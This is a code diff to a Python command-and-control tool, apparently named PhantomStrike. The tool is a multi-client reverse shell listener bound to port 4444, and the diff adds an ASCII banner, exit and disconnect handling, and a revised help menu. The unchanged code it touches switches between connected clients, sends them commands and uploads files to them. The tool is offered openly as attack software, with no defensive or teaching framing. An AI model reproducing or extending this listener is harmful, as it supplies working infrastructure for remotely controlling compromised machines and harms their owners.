@@ -4,11 +4,26 @@ import base64
 import json
 import select
 import os
+import sys
+import threading
+import asyncio
 from tqdm import tqdm
 class MultiClientListener:
     def __init__(self, host="0.0.0.0", port=4444):
         self.host = host
         self.port = port
+        self.logo ="""
+ ██▓███   ██░ ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ ▒█████   ███▄ ▄███▓  ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████ 
+▓██░  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀ 
+▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███   
+▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██    ▒██   ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄ 
+▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ █▄░▒████▒
+▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒ ▒▒ ▓▒░░ ▒░ ░
+░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░ ░  ░      ░░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ▒ ░░ ░▒ ▒░ ░ ░  ░
+░░        ░  ░░ ░  ░   ▒      ░   ░ ░   ░      ░ ░ ░ ▒  ░      ░   ░  ░  ░    ░        ░░   ░  ▒ ░░ ░░ ░    ░   
+          ░  ░  ░      ░  ░         ░              ░ ░         ░         ░              ░      ░  ░  ░      ░  ░
+"""                                                                                              
+
         self.selector = selectors.DefaultSelector()
         self.clients = {}  # Stores {conn: addr}
         self.client_ids = {}  # Stores {id: conn}
@@ -35,6 +50,7 @@ class MultiClientListener:
             return f"{e} this occured while receiving data"
     def start_listener(self):
         """Starts the multi-client reverse shell listener."""
+        print(self.logo)
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server.bind((self.host, self.port))
@@ -57,6 +73,7 @@ class MultiClientListener:
             print("\n[!] Shutting down listener.")
         finally:
             self.selector.close()
+            self.server.close()
 
 
     def global_command_loop(self):
@@ -66,16 +83,21 @@ class MultiClientListener:
             command = command.split(" ")
             if command[0].lower() == "list":
                 self.list_clients()
+
+            elif command[0] == "exit":
+                self.server.close()
+                sys.exit()
             elif command[0].lower()=="switch":
                 client_id = command[1]
                 self.switch_client(int(client_id))
             elif command[0].lower() == "help":
-                print("Those are the commands and their functions")
-                print("------------------------------------------")
-                print("CTRL + C     to Exit")
-                print("switch       switching from one client id to another")
-                print("exit         to exit form any client interpreter\n")
-                print("list         list all client connected.")
+                print("commands       Description")
+                print("--------       -----------")
+                print("CTRL + C       Exit Forcibly")
+                print("exit           Exiting the shell")
+                print("switch <id>    switching from one client id to another")
+                print("exit           to exit form any client interpreter\n")
+                print("list           list all client connected.")
                 print("For more information on tools see the command-line reference on the github page.")
 
 
@@ -192,14 +214,20 @@ class MultiClientListener:
                 progress.update(len(chunk))
         progress.close()
         print(f"[+] File uploaded: {os.path.basename(file_path)}")
-
-
+    async def exiting_connection(self,command):
+        self.current_client = None
+        self.sending_data(command)
+    
     def command_loop(self, command):
         """Handles commands for the selected client."""
         conn = self.client_ids.get(self.current_client)
 
         if command[0] in ["exit", "quit"]:
+            # Send data immediately
+            self.sending_data(command)
+            self.disconnect_client(conn, self.current_client)
             self.current_client = None
+
 
         elif command[0] == "list":
             self.list_clients()
